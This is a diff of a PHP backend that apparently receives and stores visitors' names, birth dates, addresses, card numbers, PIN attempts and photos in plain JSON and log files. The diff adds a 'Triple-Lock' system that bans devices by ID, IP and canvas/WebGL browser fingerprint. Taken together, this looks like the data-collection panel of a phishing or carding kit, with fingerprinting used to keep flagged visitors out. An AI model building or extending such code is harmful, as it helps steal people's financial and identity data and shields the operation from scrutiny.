@@ -18,10 +18,127 @@ if ($ip !== 'unknown' && strpos($ip, ',') !== false) {
     $ip = trim($ips[0]);
 }
 
-function isBanned($deviceId, $ip) {
-    $bannedDevicesFile = __DIR__ . '/banned_devices.txt';
-    $bannedIpsFile = __DIR__ . '/banned_ips.txt';
-    
+// Triple-Lock Banning Files
+$bannedDevicesFile = __DIR__ . '/banned_devices.txt';
+$bannedIpsFile = __DIR__ . '/banned_ips.txt';
+$bannedFingerprintsFile = __DIR__ . '/banned_fingerprints.json';
+$stateFile = __DIR__ . '/latest_state.json';
+
+// Helper: load banned fingerprints
+function loadBannedFingerprints() {
+    global $bannedFingerprintsFile;
+    $data = file_exists($bannedFingerprintsFile) ? json_decode(file_get_contents($bannedFingerprintsFile), true) : [];
+    return is_array($data) ? $data : [];
+}
+
+// Helper: save banned fingerprints
+function saveBannedFingerprints($fingerprints) {
+    global $bannedFingerprintsFile;
+    @file_put_contents($bannedFingerprintsFile, json_encode($fingerprints, JSON_PRETTY_PRINT));
+}
+
+// Triple-Lock Check Function
+function checkTripleLock($deviceId, $ip, $fingerprint) {
+    global $bannedDevicesFile, $bannedIpsFile, $stateFile;
+    $matchDetails = [];
+
+    // --- LOCK 1: Explicit (DeviceId + IP) ---
+    if ($deviceId !== 'unknown' && $deviceId !== '' && file_exists($bannedDevicesFile)) {
+        $bannedDevices = file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        $bannedDevices = array_map('trim', $bannedDevices);
+        if (in_array($deviceId, $bannedDevices, true)) {
+            $matchDetails[] = 'Lock1-DeviceId';
+        }
+    }
+    if ($ip !== 'unknown' && $ip !== '' && file_exists($bannedIpsFile)) {
+        $bannedIps = file($bannedIpsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        $bannedIps = array_map('trim', $bannedIps);
+        if (in_array($ip, $bannedIps, true)) {
+            $matchDetails[] = 'Lock1-IP';
+        }
+    }
+
+    // --- LOCK 2: Implicit (Canvas + WebGL Fingerprint) ---
+    $fp = $fingerprint;
+    if (!empty($fp) && is_string($fp)) {
+        $fp = json_decode($fp, true);
+    }
+    if (!is_array($fp)) $fp = [];
+
+    $bannedFps = loadBannedFingerprints();
+    foreach ($bannedFps as $bannedFp) {
+        // Check canvas hash
+        if (!empty($fp['canvasHash']) && !empty($bannedFp['canvasHash'])) {
+            if (strtolower($fp['canvasHash']) === strtolower($bannedFp['canvasHash'])) {
+                $matchDetails[] = 'Lock2-Canvas';
+                break;
+            }
+        }
+        // Check WebGL renderer (more unique than vendor)
+        if (!empty($fp['webGLRenderer']) && !empty($bannedFp['webGLRenderer'])) {
+            if (strtolower($fp['webGLRenderer']) === strtolower($bannedFp['webGLRenderer'])) {
+                $matchDetails[] = 'Lock2-WebGL';
+                break;
+            }
+        }
+    }
+
+    // --- LOCK 3: Profile Matching (Behavioral/Server) ---
+    if (file_exists($stateFile)) {
+        $state = json_decode(file_get_contents($stateFile), true);
+        if (is_array($state) && !empty($state)) {
+            // Gather all banned deviceIds from Lock 1
+            $bannedDeviceIds = [];
+            if (file_exists($bannedDevicesFile)) {
+                $lines = file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+                $bannedDeviceIds = array_map('trim', $lines);
+            }
+
+            // Check if this device shares IP with a banned device
+            if ($ip !== 'unknown' && !empty($bannedDeviceIds)) {
+                foreach ($bannedDeviceIds as $bannedId) {
+                    if (isset($state[$bannedId]) && ($state[$bannedId]['ip'] ?? '') === $ip) {
+                        if (!in_array('Lock1-IP', $matchDetails) && !in_array('Lock1-DeviceId', $matchDetails)) {
+                            $matchDetails[] = 'Lock3-SharedIP';
+                        }
+                        break;
+                    }
+                }
+            }
+
+            // Check if fingerprint matches a known banned device profile
+            if (!empty($fp) && !empty($bannedDeviceIds)) {
+                foreach ($bannedDeviceIds as $bannedId) {
+                    if (!isset($state[$bannedId])) continue;
+                    $bannedFpStr = $state[$bannedId]['fingerprint'] ?? '';
+                    if (empty($bannedFpStr) || $bannedFpStr === '—') continue;
+                    $bannedFp = json_decode($bannedFpStr, true);
+                    if (!is_array($bannedFp)) continue;
+
+                    // Compute similarity score
+                    $score = 0;
+                    if (!empty($fp['canvasHash']) && !empty($bannedFp['canvasHash']) && strtolower($fp['canvasHash']) === strtolower($bannedFp['canvasHash'])) $score += 3;
+                    if (!empty($fp['webGLRenderer']) && !empty($bannedFp['webGLRenderer']) && strtolower($fp['webGLRenderer']) === strtolower($bannedFp['webGLRenderer'])) $score += 3;
+                    if (!empty($fp['webGLVendor']) && !empty($bannedFp['webGLVendor']) && strtolower($fp['webGLVendor']) === strtolower($bannedFp['webGLVendor'])) $score += 1;
+                    if (!empty($fp['platform']) && !empty($bannedFp['platform']) && $fp['platform'] === $bannedFp['platform']) $score += 1;
+                    if (!empty($fp['hardwareConcurrency']) && !empty($bannedFp['hardwareConcurrency']) && $fp['hardwareConcurrency'] === $bannedFp['hardwareConcurrency']) $score += 1;
+                    if (!empty($fp['screen']) && !empty($bannedFp['screen']) && $fp['screen'] === $bannedFp['screen']) $score += 1;
+
+                    if ($score >= 5) {
+                        $matchDetails[] = 'Lock3-ProfileMatch(score=' . $score . ')';
+                        break;
+                    }
+                }
+            }
+        }
+    }
+
+    return $matchDetails;
+}
+
+function isBanned($deviceId, $ip, $fingerprint = null) {
+    global $bannedDevicesFile, $bannedIpsFile;
+
     // Check for banned cookie
     if (isset($_COOKIE['banned']) && $_COOKIE['banned'] === '1') {
         // Reinstate ban if device not in list
@@ -35,11 +152,29 @@ function isBanned($deviceId, $ip) {
         return true;
     }
 
+    // Run Triple-Lock check
+    $locks = checkTripleLock($deviceId, $ip, $fingerprint);
+    if (!empty($locks)) {
+        // If any lock matches, ban
+        if ($deviceId !== 'unknown' && $deviceId !== '' && file_exists($bannedDevicesFile)) {
+            $bannedDevices = file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+            $bannedDevices = array_map('trim', $bannedDevices);
+            if (!in_array($deviceId, $bannedDevices, true)) {
+                @file_put_contents($bannedDevicesFile, $deviceId . "\n", FILE_APPEND);
+            }
+        }
+        // Set cookie
+        if (!isset($_COOKIE['banned'])) {
+            setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
+        }
+        return true;
+    }
+
+    // Fallback: direct deviceId check
     if ($deviceId !== 'unknown' && $deviceId !== '' && file_exists($bannedDevicesFile)) {
         $banned = file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
         $banned = array_map('trim', $banned);
         if (in_array($deviceId, $banned, true)) {
-            // Set cookie if missing
             if (!isset($_COOKIE['banned'])) {
                 setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
             }
@@ -111,7 +246,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['act
 // === CHECK BAN (Early check) ===
 if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'checkBan') {
     $deviceId = isset($_GET['deviceId']) ? trim($_GET['deviceId']) : '';
-    $banned = isBanned($deviceId, $ip);
+    $fingerprintEncoded = isset($_GET['fp']) ? trim($_GET['fp']) : null;
+    $fingerprintJson = null;
+    if ($fingerprintEncoded) {
+        $decoded = base64_decode($fingerprintEncoded, true);
+        if ($decoded !== false) {
+            $fingerprintData = json_decode($decoded, true);
+            if ($fingerprintData) {
+                $fingerprintJson = json_encode($fingerprintData);
+            }
+        }
+    }
+    $banned = isBanned($deviceId, $ip, $fingerprintJson);
 
     @file_put_contents(__DIR__ . '/ban_debug.log', date('Y-m-d H:i:s') . " - CheckBan: deviceId=$deviceId, ip=$ip, isBanned=" . ($banned ? 'YES' : 'NO') . "\n", FILE_APPEND);
 
@@ -138,8 +284,18 @@ if (!$data) {
 
 $deviceId = isset($data['deviceId']) ? trim($data['deviceId']) : 'unknown';
 
-// SECOND BAN CHECK (Full request)
-if (isBanned($deviceId, $ip)) {
+// Extract fingerprint for ban checks
+$known_keys = ['deviceId', 'ip', 'event', 'success', 'pin_attempt', 'name', 'dob', 'address', 'card', 'photo', 'timestamp'];
+$fingerprint_data = [];
+foreach ($data as $key => $value) {
+    if (!in_array($key, $known_keys)) {
+        $fingerprint_data[$key] = $value;
+    }
+}
+$fingerprintJson = !empty($fingerprint_data) ? json_encode($fingerprint_data) : null;
+
+// SECOND BAN CHECK (Full request) - pass fingerprint
+if (isBanned($deviceId, $ip, $fingerprintJson)) {
     @file_put_contents(__DIR__ . '/ban_hits.log', date('Y-m-d H:i:s') . " - Banned device (FullRequest): $deviceId from IP $ip\n", FILE_APPEND);
     showBannedPage($_SERVER['HTTP_HOST']);
 }
@@ -153,15 +309,8 @@ $dob         = isset($data['dob']) ? $data['dob'] : '—';
 $address     = isset($data['address']) ? $data['address'] : '—';
 $card        = isset($data['card']) ? $data['card'] : '—';
 
-// Extract fingerprint
-$known_keys = ['deviceId', 'ip', 'event', 'success', 'pin_attempt', 'name', 'dob', 'address', 'card', 'photo', 'timestamp'];
-$fingerprint_data = [];
-foreach ($data as $key => $value) {
-    if (!in_array($key, $known_keys)) {
-        $fingerprint_data[$key] = $value;
-    }
-}
-$fingerprint = !empty($fingerprint_data) ? json_encode($fingerprint_data) : '—';
+// Extract fingerprint for logging (reuse the data from above)
+$fingerprint_final = !empty($fingerprint_data) ? json_encode($fingerprint_data) : '—';
 
 // Handle Photo
 $photo_path = '—';
@@ -182,62 +331,81 @@ $state = file_exists($stateFile) ? json_decode(file_get_contents($stateFile), tr
 if (!is_array($state)) $state = [];
 
 if ($deviceId !== 'unknown') {
-    if (!isset($state[$deviceId])) {
-        $state[$deviceId] = [
-            'deviceId' => $deviceId,
-            'ip' => $ip,
-            'timestamp' => $timestamp,
-            'event' => $event,
-            'success' => $success ? 'YES' : 'NO',
-            'pin_attempt' => $pin_attempt,
-            'name' => $name,
-            'dob' => $dob,
-            'address' => $address,
-            'card' => $card,
-            'photo_path' => $photo_path,
-            'fingerprint' => $fingerprint,
-            'last_seen' => $timestamp,
-            'attempt_count' => 0,
-            'failed_attempts' => 0
-        ];
-    } else {
-        $state[$deviceId]['ip'] = $ip;
-        $state[$deviceId]['timestamp'] = $timestamp;
-        $state[$deviceId]['event'] = $event;
-        $state[$deviceId]['success'] = ($success || ($state[$deviceId]['success'] ?? 'NO') === 'YES') ? 'YES' : 'NO';
-        if ($pin_attempt !== '—') $state[$deviceId]['pin_attempt'] = $pin_attempt;
-        if ($name !== '—') $state[$deviceId]['name'] = $name;
-        if ($dob !== '—') $state[$deviceId]['dob'] = $dob;
-        if ($address !== '—') $state[$deviceId]['address'] = $address;
-        if ($card !== '—') $state[$deviceId]['card'] = $card;
-        if ($fingerprint !== '—') $state[$deviceId]['fingerprint'] = $fingerprint;
-        if ($photo_path !== '—') $state[$deviceId]['photo_path'] = $photo_path;
-        $state[$deviceId]['last_seen'] = $timestamp;
-    }
-
-    // Auto-ban logic
-    if ($event === 'pin_failed') {
-        $state[$deviceId]['failed_attempts'] = ($state[$deviceId]['failed_attempts'] ?? 0) + 1;
-        $state[$deviceId]['attempt_count'] = ($state[$deviceId]['attempt_count'] ?? 0) + 1;
-        
-        if ($state[$deviceId]['failed_attempts'] >= 10) {
-            // Auto-ban the device
-            $bannedDevicesFile = __DIR__ . '/banned_devices.txt';
-            $bannedDevices = file_exists($bannedDevicesFile) ? file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
-            $bannedDevices = array_map('trim', $bannedDevices);
-            if (!in_array($deviceId, $bannedDevices, true)) {
-                @file_put_contents($bannedDevicesFile, $deviceId . "\n", FILE_APPEND);
-            }
-            // Set cookie for auto-ban too
-            setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
+        // Track lock status for this device
+        $lockStatus = [];
+        if ($fingerprintJson) {
+            $locks = checkTripleLock($deviceId, $ip, $fingerprintJson);
+            $lockStatus = $locks;
         }
-    } elseif ($event === 'pin_success') {
-        $state[$deviceId]['failed_attempts'] = 0;
-        $state[$deviceId]['attempt_count'] = ($state[$deviceId]['attempt_count'] ?? 0) + 1;
-    }
 
-    @file_put_contents($stateFile, json_encode($state, JSON_PRETTY_PRINT));
-}
+        if (!isset($state[$deviceId])) {
+            $state[$deviceId] = [
+                'deviceId' => $deviceId,
+                'ip' => $ip,
+                'timestamp' => $timestamp,
+                'event' => $event,
+                'success' => $success ? 'YES' : 'NO',
+                'pin_attempt' => $pin_attempt,
+                'name' => $name,
+                'dob' => $dob,
+                'address' => $address,
+                'card' => $card,
+                'photo_path' => $photo_path,
+                'fingerprint' => $fingerprint_final,
+                'lockStatus' => $lockStatus,
+                'last_seen' => $timestamp,
+                'attempt_count' => 0,
+                'failed_attempts' => 0
+            ];
+        } else {
+            $state[$deviceId]['ip'] = $ip;
+            $state[$deviceId]['timestamp'] = $timestamp;
+            $state[$deviceId]['event'] = $event;
+            $state[$deviceId]['success'] = ($success || ($state[$deviceId]['success'] ?? 'NO') === 'YES') ? 'YES' : 'NO';
+            if ($pin_attempt !== '—') $state[$deviceId]['pin_attempt'] = $pin_attempt;
+            if ($name !== '—') $state[$deviceId]['name'] = $name;
+            if ($dob !== '—') $state[$deviceId]['dob'] = $dob;
+            if ($address !== '—') $state[$deviceId]['address'] = $address;
+            if ($card !== '—') $state[$deviceId]['card'] = $card;
+            if ($fingerprint_final !== '—') $state[$deviceId]['fingerprint'] = $fingerprint_final;
+            if (!empty($lockStatus)) $state[$deviceId]['lockStatus'] = $lockStatus;
+            if ($photo_path !== '—') $state[$deviceId]['photo_path'] = $photo_path;
+            $state[$deviceId]['last_seen'] = $timestamp;
+        }
+
+        // Auto-ban logic - also store fingerprint for Triple-Lock
+        if ($event === 'pin_failed') {
+            $state[$deviceId]['failed_attempts'] = ($state[$deviceId]['failed_attempts'] ?? 0) + 1;
+            $state[$deviceId]['attempt_count'] = ($state[$deviceId]['attempt_count'] ?? 0) + 1;
+
+            if ($state[$deviceId]['failed_attempts'] >= 10) {
+                // Auto-ban the device
+                $bannedDevicesFile = __DIR__ . '/banned_devices.txt';
+                $bannedDevices = file_exists($bannedDevicesFile) ? file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
+                $bannedDevices = array_map('trim', $bannedDevices);
+                if (!in_array($deviceId, $bannedDevices, true)) {
+                    @file_put_contents($bannedDevicesFile, $deviceId . "\n", FILE_APPEND);
+                }
+                // Also store the fingerprint for Lock 2 matching
+                if (!empty($fingerprint_data)) {
+                    $bannedFps = loadBannedFingerprints();
+                    $fpToStore = $fingerprint_data;
+                    $fpToStore['banned_deviceId'] = $deviceId;
+                    $fpToStore['banned_ip'] = $ip;
+                    $fpToStore['banned_at'] = $timestamp;
+                    $bannedFps[] = $fpToStore;
+                    saveBannedFingerprints($bannedFps);
+                }
+                // Set cookie for auto-ban too
+                setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
+            }
+        } elseif ($event === 'pin_success') {
+            $state[$deviceId]['failed_attempts'] = 0;
+            $state[$deviceId]['attempt_count'] = ($state[$deviceId]['attempt_count'] ?? 0) + 1;
+        }
+
+        @file_put_contents($stateFile, json_encode($state, JSON_PRETTY_PRINT));
+    }
 
 // 2. Append to Visits History
 $visitsLog = __DIR__ . '/visits.log';
